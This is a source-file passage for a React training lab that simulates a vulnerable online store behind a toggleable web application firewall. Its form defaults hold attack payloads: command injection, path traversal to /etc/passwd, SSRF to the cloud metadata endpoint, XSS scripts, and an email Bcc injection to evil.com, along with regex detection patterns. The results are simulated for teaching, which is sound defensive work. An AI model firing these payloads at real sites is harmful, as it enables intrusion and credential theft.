// ============================================================================
// WebGuard — Web Lab: Multi-page realistic website simulation
// Apex CyberStore & Cloud Platform — Light-Themed Modern Enterprise Application
// with Progressive Authentication, IDOR order lookup, Stored/Reflected XSS,
// SQLi bypass, diagnostics, and 100% reliable WAF prevention
// ============================================================================

import { useState, useCallback, useRef, useEffect, useMemo } from "react";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { cn } from "@/lib/utils";
import { useWaf } from "../engine";
import { uid, shannonEntropy, randInt } from "../engine";
import type { HttpMethod, Severity, VulnFinding } from "../types";
import { SEVERITY_META } from "../types";
import {
  VULN_DEFS,
  type VulnId,
  type SiteTemplateId,
  type LabSiteConfig,
  runLabAttack,
  labResultToLog,
  labResultToFinding,
} from "../vulnLab";
import {
  AlertTriangle,
  ArrowLeft,
  ArrowRight,
  Ban,
  BarChart3,
  Bell,
  BookOpen,
  Bug,
  CheckCircle2,
  ChevronDown,
  ChevronRight,
  ClipboardList,
  Copy,
  Cpu,
  CreditCard,
  Download,
  Eye,
  EyeOff,
  ExternalLink,
  FileCode,
  FileText,
  Filter,
  Flame,
  Globe2,
  HardDrive,
  Home,
  Info,
  Key,
  Laptop,
  Layers,
  LayoutDashboard,
  Lock,
  LogOut,
  Mail,
  MessageSquare,
  Package,
  Play,
  Plus,
  RefreshCw,
  Search,
  Send,
  Server,
  Settings,
  Shield,
  ShieldAlert,
  ShieldCheck,
  ShieldOff,
  ShoppingCart,
  Sparkles,
  Star,
  Terminal,
  Trash2,
  TrendingUp,
  Unlock,
  User,
  UserCheck,
  Users,
  Wrench,
  X,
  Zap,
} from "lucide-react";

// ============================================================================
// Types
// ============================================================================

export type SitePage =
  | "home"
  | "products"
  | "product-detail"
  | "cart"
  | "login"
  | "dashboard"
  | "settings"
  | "docs"
  | "contact"
  | "diagnostics"
  | "admin";

interface WebLabProps {
  templateId?: SiteTemplateId;
  enabledVulns?: VulnId[];
  wafOn?: boolean;
}

interface SiteAlert {
  id: string;
  type: "success" | "error" | "warning" | "info";
  title: string;
  detail: string;
  ts: number;
}

interface LogEntry {
  id: string;
  ts: number;
  type: "request" | "response" | "waf" | "error";
  method?: string;
  path?: string;
  status?: number;
  statusText?: string;
  headers?: Record<string, string>;
  body?: string;
  blocked?: boolean;
  vulnId?: VulnId;
  threatScore?: number;
  exploitEvidence?: string;
}

interface Product {
  id: number;
  name: string;
  category: "hardware" | "software" | "cloud" | "tokens";
  price: number;
  rating: number;
  reviewsCount: number;
  badge?: string;
  description: string;
  specs: string[];
  stock: number;
  icon: string;
}

interface ProductReview {
  id: string;
  author: string;
  rating: number;
  date: string;
  comment: string;
  isExploit?: boolean;
}

interface OrderRecord {
  id: string;
  customerName: string;
  email: string;
  cardLast4: string;
  total: number;
  date: string;
  status: "Shipped" | "Delivered" | "Processing";
  items: string[];
  shippingAddress: string;
  isConfidential?: boolean;
}

// ============================================================================
// Data Fixtures
// ============================================================================

const PRODUCTS: Product[] = [
  {
    id: 101,
    name: "Apex Titan Security Key Pro",
    category: "tokens",
    price: 69.99,
    rating: 4.9,
    reviewsCount: 148,
    badge: "Bestseller",
    description: "FIDO2 / WebAuthn hardware authenticator with NFC & biometrics for zero-trust MFA.",
    specs: ["FIDO2 Level 3 Certified", "USB-C & NFC Dual-Interface", "Hardware Crypto Engine", "Tamper-Resistant Silicon"],
    stock: 42,
    icon: "🔑",
  },
  {
    id: 102,
    name: "Apex CyberGuard WAF Appliance X900",
    category: "hardware",
    price: 1899.0,
    rating: 4.8,
    reviewsCount: 56,
    badge: "Enterprise",
    description: "High-throughput 40 Gbps rack-mount hardware firewall with on-chip AI ML threat classification.",
    specs: ["40 Gbps Deep Packet Inspection", "Sub-millisecond Latency", "Dual 10GbE SFP+ Ports", "Redundant Titanium PSU"],
    stock: 12,
    icon: "🛡️",
  },
  {
    id: 103,
    name: "CloudShield SOC Managed Defense",
    category: "cloud",
    price: 499.0,
    rating: 4.7,
    reviewsCount: 89,
    badge: "Popular",
    description: "24/7 AI-augmented SIEM & automated threat triage with instant incident response playbooks.",
    specs: ["Unlimited EPS Logging", "Automated Gemini Copilot Triage", "Anycast Edge Routing", "SOC 2 Type II Certified"],
    stock: 999,
    icon: "☁️",
  },
  {
    id: 104,
    name: "Apex Encrypted NVMe SSD 2TB",
    category: "hardware",
    price: 249.99,
    rating: 4.9,
    reviewsCount: 210,
    description: "Self-encrypting hardware drive with AES-XTS 256-bit crypto controller and physical tamper wipe.",
    specs: ["7,400 MB/s Sequential Read", "FIPS 140-3 Level 2 Cryptography", "Zero-Trace Wipe Trigger", "PCIe Gen4 x4 Interface"],
    stock: 28,
    icon: "💾",
  },
  {
    id: 105,
    name: "DevSecOps CI/CD Vulnerability Scanner",
    category: "software",
    price: 199.0,
    rating: 4.6,
    reviewsCount: 34,
    description: "Automated DAST/SAST scanner for GitHub Actions and GitLab pipelines with OWASP Top 10 rule validation.",
    specs: ["Automated Pull Request Checks", "Container Image Analysis", "SBOM Auto-Generation", "Zero-Day Threat Feeds"],
    stock: 999,
    icon: "⚡",
  },
  {
    id: 106,
    name: "Zero-Trust Mesh Gateway Router",
    category: "hardware",
    price: 449.0,
    rating: 4.7,
    reviewsCount: 77,
    description: "Hardware micro-segmented gateway with WireGuard crypto tunneling and continuous posture checks.",
    specs: ["WireGuard & IPsec Engine", "10 Gbps Firewall Routing", "Autonomous SD-WAN Mesh", "Multi-WAN Auto-Failover"],
    stock: 19,
    icon: "🌐",
  },
];

const INITIAL_REVIEWS: ProductReview[] = [
  {
    id: "rev-1",
    author: "Elena Rostova (Lead Security Architect)",
    rating: 5,
    date: "2 days ago",
    comment: "Flawless FIDO2 integration. Deployed 400 keys across engineering with zero authentication issues.",
  },
  {
    id: "rev-2",
    author: "David Chen (DevOps Lead)",
    rating: 5,
    date: "1 week ago",
    comment: "Build quality is top tier. NFC works instantaneously with all enterprise mobile authenticators.",
  },
];

const ORDER_RECORDS: Record<string, OrderRecord> = {
  "1001": {
    id: "1001",
    customerName: "Alex Mercer (You)",
    email: "alex.mercer@apex-corp.internal",
    cardLast4: "4111",
    total: 139.98,
    date: "Today at 09:30 AM",
    status: "Processing",
    items: ["2x Apex Titan Security Key Pro"],
    shippingAddress: "742 Evergreen Terrace, Suite 100, Springfield",
    isConfidential: false,
  },
  "1002": {
    id: "1002",
    customerName: "Victoria Sterling (Chief Financial Officer)",
    email: "v.sterling@apex-finance.internal",
    cardLast4: "9821 [AMEX BLACK VIP]",
    total: 14890.0,
    date: "Yesterday at 04:15 PM",
    status: "Shipped",
    items: ["5x Apex CyberGuard WAF Appliance X900", "Enterprise Multi-Region License"],
    shippingAddress: "Executive Suite 4500, Apex Tower, 100 Wall Street, NY",
    isConfidential: true,
  },
  "1003": {
    id: "1003",
    customerName: "Dr. Jonathan Hayes (Director of Threat Intelligence)",
    email: "j.hayes@classified-soc.gov",
    cardLast4: "5542 [GOV PROCUREMENT]",
    total: 3990.0,
    date: "3 days ago",
    status: "Delivered",
    items: ["10x Apex Encrypted NVMe SSD 2TB", "Tamper-Proof Hardware Vault"],
    shippingAddress: "Secure Vault Facility 7B, Redstone Arsenal, AL",
    isConfidential: true,
  },
  "1004": {
    id: "1004",
    customerName: "Sarah Jenkins (Senior Database Admin)",
    email: "s.jenkins@apex-cloud.internal",
    cardLast4: "3782",
    total: 499.0,
    date: "5 days ago",
    status: "Delivered",
    items: ["1x CloudShield SOC Managed Defense"],
    shippingAddress: "404 North First St, San Jose, CA",
    isConfidential: true,
  },
};

const FAKE_USERS = [
  {
    username: "admin",
    password: "admin123",
    name: "Alex Vance (SuperAdmin)",
    role: "System Administrator",
    email: "admin@apex-cyberstore.io",
    avatar: "👑",
    apiKeys: "sk_live_9981_apex_titan_super_secret_master_key",
    department: "Executive Security Operations",
  },
  {
    username: "jsmith",
    password: "password",
    name: "John Smith",
    role: "Senior Developer",
    email: "john.smith@apex-cyberstore.io",
    avatar: "💻",
    apiKeys: "sk_live_4120_dev_test_token",
    department: "Application Engineering",
  },
  {
    username: "customer",
    password: "customer123",
    name: "Emma Watson",
    role: "Customer",
    email: "emma@customer.com",
    avatar: "👤",
    apiKeys: "sk_test_public_guest_key",
    department: "Public Consumer",
  },
];

const DOC_ARTICLES = [
  { id: "doc-1", title: "Configuring Virtual Patching on WebGuard WAF", category: "WAF Policy", snippet: "Learn how to deploy regex and ML-driven virtual patches at the edge to block zero-day exploits before backend remediation." },
  { id: "doc-2", title: "OWASP Top 10 Attack Signatures & Prevention", category: "Threat Intelligence", snippet: "Detailed breakdown of SQLi, Stored/Reflected XSS, SSRF, Path Traversal, and Command Injection signatures." },
  { id: "doc-3", title: "FIDO2 Hardware Key Zero-Trust Integration", category: "Identity & Access", snippet: "Step-by-step setup guide for WebAuthn credential enrollment and biometric enforcement across distributed endpoints." },
];

// ============================================================================
// Main WebLabTab Component
// ============================================================================

export function WebLabTab({
  templateId = "login",
  enabledVulns = [
    "sqli-login",
    "sqli-search",
    "sqli-api",
    "reflected-xss",
    "stored-xss",
    "idor",
    "cmdi",
    "path-traversal",
    "ssrf",
    "email-injection",
    "brute-force",
  ],
  wafOn: externalWafOn,
}: WebLabProps) {
  const { state: wafState, dispatch } = useWaf();

  // Internal WAF toggle (defaults to global WAF state if not explicitly passed)
  const [internalWafOn, setInternalWafOn] = useState<boolean>(
    externalWafOn !== undefined ? externalWafOn : wafState.mode === "blocking"
  );
  const activeWaf = internalWafOn;

  // Multi-page navigation state
  // Default initial page: "home" (clean normal public home page)
  const [currentPage, setCurrentPage] = useState<SitePage>("home");
  const [selectedProduct, setSelectedProduct] = useState<Product>(PRODUCTS[0]);
  const [currentUser, setCurrentUser] = useState<typeof FAKE_USERS[0] | null>(null);
  const [cart, setCart] = useState<{ product: Product; quantity: number }[]>([
    { product: PRODUCTS[0], quantity: 1 },
  ]);
  const [selectedCategory, setSelectedCategory] = useState<string>("all");
  const [searchQuery, setSearchQuery] = useState<string>("");
  const [navigating, setNavigating] = useState<boolean>(false);
  const [siteAlert, setSiteAlert] = useState<SiteAlert | null>(null);

  // Dynamic Content & Exploit State
  const [reviews, setReviews] = useState<ProductReview[]>(INITIAL_REVIEWS);
  const [activeExploitDisplay, setActiveExploitDisplay] = useState<{
    vulnId: VulnId;
    title: string;
    description: string;
    evidence: string;
    data?: any;
  } | null>(null);

  // Tools & Diagnostics State
  const [pingHost, setPingHost] = useState<string>("8.8.8.8; whoami");
  const [pingOutput, setPingOutput] = useState<string | null>(null);
  const [traversalPath, setTraversalPath] = useState<string>("../../../../etc/passwd");
  const [traversalOutput, setTraversalOutput] = useState<string | null>(null);
  const [webhookUrl, setWebhookUrl] = useState<string>("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
  const [webhookOutput, setWebhookOutput] = useState<string | null>(null);

  // Order Lookup IDOR State
  const [orderLookupId, setOrderLookupId] = useState<string>("1002");
  const [lookedUpOrder, setLookedUpOrder] = useState<OrderRecord | null>(null);

  // Review Form Stored XSS State
  const [newReviewAuthor, setNewReviewAuthor] = useState<string>("Security Tester");
  const [newReviewRating, setNewReviewRating] = useState<number>(5);
  const [newReviewComment, setNewReviewComment] = useState<string>("<script>alert('Stored XSS in Reviews!')</script>");

  // Support Form State
  const [contactName, setContactName] = useState<string>("Jane Hacker");
  const [contactEmail, setContactEmail] = useState<string>("jane@test.com%0ABcc:attacker-exfil@evil.com");
  const [contactSubject, setContactSubject] = useState<string>("Security Disclosure");
  const [contactMessage, setContactMessage] = useState<string>("<img src=x onerror=alert('Stored XSS in Ticket #892')>");

  // Traffic Logs & Terminal Tab
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [lastResult, setLastResult] = useState<LogEntry | null>(null);
  const [attackEffect, setAttackEffect] = useState<"exploit" | "blocked" | null>(null);
  const [responseTab, setResponseTab] = useState<"visual" | "http" | "analysis">("visual");

  const logsEndRef = useRef<HTMLDivElement>(null);

  // Sync internal WAF toggle if parent prop changes
  useEffect(() => {
    if (externalWafOn !== undefined) {
      setInternalWafOn(externalWafOn);
    }
  }, [externalWafOn]);

  // Page navigation
  const navigateTo = useCallback(
    (page: SitePage) => {
      if (page === currentPage) return;
      setNavigating(true);
      setSiteAlert(null);
      setTimeout(() => {
        setCurrentPage(page);
        setNavigating(false);
      }, 100);
    },
    [currentPage]
  );

  // Helper: Execute and log an attack / action through the simulated WAF engine
  const executeRequest = useCallback(
    (payload: string, field: string, method: HttpMethod, path: string, explicitVuln?: VulnId) => {
      const config: LabSiteConfig = {
        templateId: templateId || "login",
        enabledVulns: enabledVulns || [],
        customVulnName: "",
        customVulnPayload: "",
        customVulnSeverity: "medium",
        fieldValues: { [field]: payload },
      };

      const result = runLabAttack(config, payload, method, path, activeWaf);

      const reqHeaders: Record<string, string> = {
        Host: "apex-cyberstore.io",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        Accept: "text/html,application/json",
      };
      if (method === "POST") reqHeaders["Content-Type"] = "application/x-www-form-urlencoded";

      const reqLog: LogEntry = {
        id: uid("REQ"),
        ts: Date.now(),
        type: "request",
        method,
        path,
        headers: reqHeaders,
        body: payload,
      };

      const effectiveVulnId = explicitVuln || result.vulnId;
      const isBlocked = activeWaf && result.blocked;

      const resLog: LogEntry = {
        id: uid("LOG"),
        ts: Date.now() + 50,
        type: isBlocked ? "waf" : "response",
        status: isBlocked ? 403 : result.response.status,
        statusText: isBlocked ? "Forbidden" : result.response.status === 200 ? "OK" : "Error",
        headers: isBlocked
          ? {
              "X-WebGuard-Rule": `OWASP-CRS-${(effectiveVulnId || "CUSTOM").toUpperCase()}`,
              "X-WebGuard-Action": "blocked",
              "X-WebGuard-Threat-Score": String(result.threatScore || 85),
            }
          : { "Content-Type": "application/json; charset=utf-8", "Cache-Control": "no-store" },
        body: isBlocked ? result.response.body : result.response.body,
        blocked: isBlocked,
        vulnId: effectiveVulnId,
        threatScore: result.threatScore,
        exploitEvidence: result.evidence,
      };

      setLogs((prev) => [...prev, reqLog, resLog]);
      setLastResult(resLog);

      if (isBlocked) {
        setAttackEffect("blocked");
        setActiveExploitDisplay(null);
        const def = VULN_DEFS[effectiveVulnId];
        setSiteAlert({
          id: uid("ALT"),
          type: "warning",
          title: "🛡️ Intercepted & Blocked by WebGuard WAF (403 Forbidden)",
          detail: `${def?.label || "Attack payload"} was analyzed and dropped at the edge before reaching the backend.`,
          ts: Date.now(),
        });
        toast.success("🛡️ WAF Blocked Malicious Payload", {
          description: `${def?.label || "Attack"} — 403 Forbidden`,
        });
      } else {
        setAttackEffect("exploit");
        const def = VULN_DEFS[effectiveVulnId];
        if (effectiveVulnId && effectiveVulnId !== "custom") {
          setSiteAlert({
            id: uid("ALT"),
            type: "error",
            title: "⚠️ Vulnerability Exploited! (WAF is OFF)",
            detail: `${def?.label || "Vulnerability"} executed successfully — backend returned 200 OK.`,
            ts: Date.now(),
          });
          toast.error("⚠️ Exploit Succeeded (WAF OFF)", {
            description: `${def?.label || "Exploit"} executed against backend.`,
          });
        }
      }

      setTimeout(() => setAttackEffect(null), 1800);

      // Sync to global SOC
      dispatch({ type: "INJECT_LOG", log: labResultToLog({ ...result, blocked: isBlocked }) });
      if (!isBlocked && effectiveVulnId && effectiveVulnId !== "custom") {
        dispatch({ type: "ADD_FINDING", finding: labResultToFinding(result) as VulnFinding });
      }

      return { ...result, blocked: isBlocked };
    },
    [templateId, enabledVulns, activeWaf, dispatch]
  );

  // Auto-scroll logs
  useEffect(() => {
    logsEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [logs]);

  // Handler: Search in store or docs
  const handleStoreSearch = (query: string) => {
    setSearchQuery(query);
    const hasPayload = /<script|union\s+select|or\s+1\s*=\s*1|'\s*--|--|\/\*|<img|<svg/i.test(query);
    if (hasPayload) {
      const isSql = /union|select|or\s+1\s*=\s*1|--|\/\*/i.test(query);
      const res = executeRequest(
        `q=${encodeURIComponent(query)}`,
        "q",
        "GET",
        `/api/products/search?q=${encodeURIComponent(query)}`,
        isSql ? "sqli-search" : "reflected-xss"
      );

      // CRITICAL: If WAF blocked it, do NOT execute or display exploit data!
      if (res.blocked) {
        setActiveExploitDisplay(null);
        return;
      }

      // WAF is OFF: show exploit result
      if (isSql) {
        setActiveExploitDisplay({
          vulnId: "sqli-search",
          title: "💥 SQL Injection — Database Rows Leaked!",
          description: "Search filter concatenated input into SQL query without parameterization.",
          evidence: `SELECT * FROM products WHERE name LIKE '%${query}%' --\nRows returned from 'users' table:\nadmin | $2y$12$eX0... | sk_live_9981_apex_titan\nceo_vance | $2y$12$kP8... | corp_card_vault_access`,
          data: [
            { user: "admin", role: "superadmin", pass_hash: "$2y$12$eX0...hashed", secret: "sk_live_9981_apex_titan" },
            { user: "ceo_vance", role: "executive", pass_hash: "$2y$12$kP8...hashed", secret: "corp_card_vault_access" },
          ],
        });
      } else {
        setActiveExploitDisplay({
          vulnId: "reflected-xss",
          title: "💥 Reflected XSS — Script Injected into DOM!",
          description: "Search query echoed in HTML response without context-aware HTML encoding.",
          evidence: `Search Results for: ${query}\nPayload executed in active browser session context.`,
        });
      }
    }
  };

  // Handler: Login
  const handleLoginSubmit = (uname: string, pword: string) => {
    const isSqli = /'|--|union|or\s+1\s*=\s*1|\/\*/i.test(uname + pword);
    const res = executeRequest(
      `username=${encodeURIComponent(uname)}&password=${encodeURIComponent(pword)}`,
      "username",
      "POST",
      "/api/auth/login",
      isSqli ? "sqli-login" : undefined
    );

    // CRITICAL: If WAF blocked it, stop immediately!
    if (res.blocked) {
      setActiveExploitDisplay(null);
      return;
    }

    // If WAF is OFF and SQLi was used: bypass login to admin
    if (isSqli) {
      const adminUser = FAKE_USERS[0];
      setCurrentUser(adminUser);
      setActiveExploitDisplay({
        vulnId: "sqli-login",
        title: "💥 SQL Injection — Authentication Bypassed!",
        description: "SQL statement evaluated to TRUE without password validation.",
        evidence: `Payload: ${uname}\nAuthenticated as: ${adminUser.name} (${adminUser.role})`,
        data: adminUser,
      });
      toast.success("Bypassed Login via SQLi", { description: "Logged in as SuperAdmin! Unlocked Admin & Diagnostics." });
      navigateTo("admin");
      return;
    }

    const matched = FAKE_USERS.find((u) => u.username === uname && u.password === pword);
    if (matched) {
      setCurrentUser(matched);
      toast.success(`Welcome back, ${matched.name}!`);
      navigateTo("dashboard");
    } else {
      toast.error("Invalid credentials (try admin/admin123 or jsmith/password)");
    }
  };

  // Handler: Post Review (Stored XSS)
  const handleAddReview = () => {
    if (!newReviewComment.trim()) return;
    const isXss = /<script|onerror|onload|<img|<svg/i.test(newReviewAuthor + newReviewComment);
    const res = executeRequest(
      `author=${encodeURIComponent(newReviewAuthor)}&rating=${newReviewRating}&comment=${encodeURIComponent(
        newReviewComment
      )}&productId=${selectedProduct.id}`,
      "comment",
      "POST",
      `/api/products/${selectedProduct.id}/reviews`,
      isXss ? "stored-xss" : undefined
    );

    if (res.blocked) {
      setActiveExploitDisplay(null);
      return;
    }

    const newRev: ProductReview = {
      id: uid("REV"),
      author: newReviewAuthor,
      rating: newReviewRating,
      date: "Just now",
      comment: newReviewComment,
      isExploit: isXss,
    };
    setReviews((prev) => [newRev, ...prev]);
    if (isXss) {
      setActiveExploitDisplay({
        vulnId: "stored-xss",
        title: "💥 Stored XSS — Script Stored in Database!",
        description: "Customer review stored without sanitization. Executes for all visitors.",
        evidence: `Stored: ${newReviewComment}\nTarget: Product #${selectedProduct.id}`,
      });
    } else {
      toast.success("Review posted successfully!");
    }
    setNewReviewComment("");
  };

  // Handler: IDOR Order Lookup
  const handleOrderLookup = (idToLookup: string) => {
    const res = executeRequest(
      `order_id=${idToLookup}`,
      "order_id",
      "GET",
      `/api/orders/${idToLookup}`,
      "idor"
    );

    if (res.blocked) {
      setLookedUpOrder(null);
      setActiveExploitDisplay(null);
      return;
    }

    const order = ORDER_RECORDS[idToLookup];
    if (order) {
      setLookedUpOrder(order);
      if (order.isConfidential) {
        setActiveExploitDisplay({
          vulnId: "idor",
          title: `💥 IDOR Exploit — Confidential Order #${order.id} Exposed!`,
          description: "Resource accessed without user session authorization.",
          evidence: `Order #${order.id} | Customer: ${order.customerName} | Card: ${order.cardLast4} | Total: $${order.total}`,
          data: order,
        });
      }
    } else {
      setLookedUpOrder(null);
      toast.info(`Order #${idToLookup} not found.`);
    }
  };

  // Handler: Network Ping (Command Injection)
  const handlePingExecute = (cmd: string) => {
    setPingHost(cmd);
    const isCmdi = /;|`|\||\$\(|whoami|cat\s|id$|dir/i.test(cmd);
    const res = executeRequest(
      `host=${encodeURIComponent(cmd)}`,
      "host",
      "POST",
      "/api/diagnostics/ping",
      isCmdi ? "cmdi" : undefined
    );

    if (res.blocked) {
      setPingOutput("❌ 403 Forbidden: Command execution intercepted by WebGuard WAF.");
      setActiveExploitDisplay(null);
      return;
    }

    if (isCmdi) {
      const simulatedOutput = `PING ${cmd.split(";")[0]} (56 data bytes)\n64 bytes from ${cmd.split(";")[0]}: icmp_seq=1 ttl=118 time=12.4 ms\n\n--- EXECUTED SYSTEM COMMAND OUTPUT ---\nuid=0(root) gid=0(root) groups=0(root)\nLinux apex-cloud-prod-node01 5.15.0-89-generic #99-Ubuntu SMP\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`;
      setPingOutput(simulatedOutput);
      setActiveExploitDisplay({
        vulnId: "cmdi",
        title: "💥 Remote Command Execution (RCE) Succeeded!",
        description: "OS command executed with root privileges on backend server.",
        evidence: `Executed command: ${cmd}\nPrivileges: root (uid=0)`,
      });
    } else {
      setPingOutput(`PING ${cmd} (56 data bytes)\n64 bytes from ${cmd}: icmp_seq=1 ttl=118 time=14.2 ms\n2 packets transmitted, 2 received, 0% packet loss`);
    }
  };

  // Handler: File Downloader (Path Traversal)
  const handleTraversalExecute = (filepath: string) => {
    setTraversalPath(filepath);
    const isTraversal = /\.\.\/|\.\.\\|%2e%2e|etc\/passwd/i.test(filepath);
    const res = executeRequest(
      `file=${encodeURIComponent(filepath)}`,
      "file",
      "GET",
      `/api/reports/download?file=${encodeURIComponent(filepath)}`,
      isTraversal ? "path-traversal" : undefined
    );

    if (res.blocked) {
      setTraversalOutput("❌ 403 Forbidden: Path traversal pattern blocked by WebGuard WAF.");
      setActiveExploitDisplay(null);
      return;
    }

    if (isTraversal) {
      const simulatedFile = `[SERVER FILE DUMP: ${filepath}]\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\npostgres:x:109:117:PostgreSQL administrator:/var/lib/postgresql:/bin/bash\n\n# Database Credentials\nDB_USER=apex_root\nDB_PASS=Sup3rS3cur3P@ssw0rd!2026\nJWT_SECRET_KEY=apex_master_jwt_secret_994182`;
      setTraversalOutput(simulatedFile);
      setActiveExploitDisplay({
        vulnId: "path-traversal",
        title: "💥 Path Traversal / LFI Succeeded!",
        description: "Arbitrary server files read via directory traversal.",
        evidence: `File: ${filepath}\nExtracted /etc/passwd & DB secrets.`,
      });
    } else {
      setTraversalOutput(`[Apex System Report]\nGenerated: ${new Date().toISOString()}\nStatus: All subsystems operational.`);
    }
  };

  // Handler: Webhook SSRF
  const handleWebhookExecute = (url: string) => {
    setWebhookUrl(url);
    const isSsrf = /169\.254|127\.0\.0\.1|localhost|internal/i.test(url);
    const res = executeRequest(
      `url=${encodeURIComponent(url)}`,
      "url",
      "POST",
      "/api/webhooks/verify",
      isSsrf ? "ssrf" : undefined
    );

    if (res.blocked) {
      setWebhookOutput("❌ 403 Forbidden: SSRF to internal CIDR blocked by WebGuard WAF.");
      setActiveExploitDisplay(null);
      return;
    }

    if (isSsrf) {
      const simulatedMetadata = `{\n  "Code": "Success",\n  "Type": "AWS-HMAC",\n  "AccessKeyId": "ASIAV4PEXMASTERKEY77",\n  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",\n  "Token": "IQoJb3JpZ2luX2VjEOr...[TEMPORARY_IAM_ROLE_CREDENTIALS]",\n  "RoleName": "ApexCloudInfrastructureSuperAdminRole"\n}`;
      setWebhookOutput(simulatedMetadata);
      setActiveExploitDisplay({
        vulnId: "ssrf",
        title: "💥 SSRF Exploit Succeeded!",
        description: "Cloud metadata credentials extracted from internal 169.254.169.254 endpoint.",
        evidence: `Target: ${url}\nIAM Role: ApexCloudInfrastructureSuperAdminRole`,
      });
    } else {
      setWebhookOutput(`{"status": "ok", "target": "${url}", "response_code": 200}`);
    }
  };

  // Filter products by category & search
  const filteredProducts = useMemo(() => {
    return PRODUCTS.filter((p) => {
      const matchesCategory = selectedCategory === "all" || p.category === selectedCategory;
      const matchesSearch =
        !searchQuery ||
        p.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
        p.description.toLowerCase().includes(searchQuery.toLowerCase());
      return matchesCategory && matchesSearch;
    });
  }, [selectedCategory, searchQuery]);

  // Total cart items & cost
  const cartTotal = useMemo(() => {
    return cart.reduce((sum, item) => sum + item.product.price * item.quantity, 0);
  }, [cart]);

  const totalReqs = logs.filter((l) => l.type === "request").length;
  const blockedReqs = logs.filter((l) => l.type === "waf").length;
  const exploitedReqs = logs.filter(
    (l) => l.type === "response" && l.vulnId && l.vulnId !== "custom"
  ).length;

  const urlPath =
    currentPage === "home"
      ? "/"
      : currentPage === "products"
      ? "/products"
      : currentPage === "product-detail"
      ? `/products/${selectedProduct.id}`
      : currentPage === "cart"
      ? "/account/cart-orders"
      : currentPage === "dashboard"
      ? "/account/dashboard"
      : currentPage === "diagnostics"
      ? "/system/diagnostics"
      : currentPage === "admin"
      ? "/admin/vault"
      : currentPage === "docs"
      ? "/knowledge-base"
      : `/${currentPage}`;

  return (
    <div className="flex flex-col gap-4 text-slate-800">
      {/* Top Banner: Master WAF Defense Controller */}
      <div
        className={cn(
          "flex flex-wrap items-center justify-between gap-4 rounded-2xl border-2 px-5 py-3.5 transition-all duration-300 shadow-sm",
          activeWaf
            ? "border-emerald-500/40 bg-emerald-50/80 text-emerald-950"
            : "border-red-500/40 bg-red-50/80 text-red-950"
        )}
      >
        <div className="flex items-center gap-3.5">
          <div
            className={cn(
              "flex size-11 items-center justify-center rounded-xl font-bold shadow-sm transition-colors",
              activeWaf
                ? "bg-emerald-500 text-white"
                : "bg-red-500 text-white"
            )}
          >
            {activeWaf ? <ShieldCheck className="size-6" /> : <ShieldOff className="size-6" />}
          </div>
          <div>
            <div className="flex items-center gap-2">
              <p className={cn("text-sm md:text-base font-extrabold tracking-tight", activeWaf ? "text-emerald-900" : "text-red-900")}>
                {activeWaf ? "🛡️ WebGuard WAF: ACTIVE (Blocking Exploits)" : "⚠️ WebGuard WAF: DISABLED (Exploit Mode)"}
              </p>
              <span
                className={cn(
                  "rounded-full px-2.5 py-0.5 text-[10px] font-bold uppercase tracking-wider shadow-sm",
                  activeWaf ? "bg-emerald-600 text-white" : "bg-red-600 text-white"
                )}
              >
                {activeWaf ? "Protected" : "Unshielded"}
              </span>
            </div>
            <p className="text-xs text-slate-600 mt-0.5 font-medium">
              {activeWaf
                ? "Edge inspection is ON. SQLi, XSS, IDOR, CMDi, and SSRF attacks will be intercepted with 403 Forbidden."
                : "Firewall is OFF. Exploits will execute directly against the simulated application."}
            </p>
          </div>
        </div>

        {/* WAF Toggle & Live Stats */}
        <div className="flex flex-wrap items-center gap-3">
          <div className="flex items-center gap-3 rounded-xl border border-slate-200 bg-white px-3.5 py-1.5 text-xs shadow-sm">
            <div className="text-center">
              <p className="font-mono font-bold text-slate-900">{totalReqs}</p>
              <p className="text-[9px] text-slate-500 uppercase font-semibold">Total Reqs</p>
            </div>
            <div className="h-6 w-px bg-slate-200" />
            <div className="text-center">
              <p className="font-mono font-bold text-emerald-600">{blockedReqs}</p>
              <p className="text-[9px] text-slate-500 uppercase font-semibold">Blocked</p>
            </div>
            <div className="h-6 w-px bg-slate-200" />
            <div className="text-center">
              <p className="font-mono font-bold text-red-600">{exploitedReqs}</p>
              <p className="text-[9px] text-slate-500 uppercase font-semibold">Exploited</p>
            </div>
          </div>

          <Button
            size="sm"
            onClick={() => setInternalWafOn((v) => !v)}
            className={cn(
              "gap-2 font-bold text-xs h-9 px-4 rounded-xl transition-all shadow-sm",
              activeWaf
                ? "bg-red-600 text-white hover:bg-red-700"
                : "bg-emerald-600 text-white hover:bg-emerald-700"
            )}
          >
            {activeWaf ? (
              <>
                <ShieldOff className="size-4" /> Turn WAF OFF (Test Exploits)
              </>
            ) : (
              <>
                <ShieldCheck className="size-4" /> Turn WAF ON (Protect Site)
              </>
            )}
          </Button>
        </div>
      </div>

      {/* Main Sandbox Grid */}
      <div className="grid grid-cols-1 gap-4 xl:grid-cols-12">
        {/* ═══════════════════════════════════════════════════════════════════
            LEFT: Interactive Simulated Website (Light-Themed Browser Frame)
        ════════════════════════════════════════════════════════════════════ */}
        <div className="xl:col-span-7 flex flex-col gap-3">
          <div className="overflow-hidden p-0 shadow-md rounded-2xl border border-slate-200 bg-white text-slate-900">
            {/* Browser Window Chrome */}
            <div className="flex items-center gap-2.5 border-b border-slate-200 bg-slate-100/90 px-4 py-2.5">
              <div className="flex items-center gap-1.5">
                <span className="size-3 rounded-full bg-rose-400 shadow-sm" />
                <span className="size-3 rounded-full bg-amber-400 shadow-sm" />
                <span className="size-3 rounded-full bg-emerald-400 shadow-sm" />
              </div>

              {/* Navigation Controls */}
              <div className="flex items-center gap-1 text-slate-500 ml-1">
                <button
                  type="button"
                  onClick={() => navigateTo("home")}
                  className="rounded p-1 hover:bg-slate-200 hover:text-slate-900 transition"
                  title="Home"
                >
                  <Home className="size-3.5" />
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setNavigating(true);
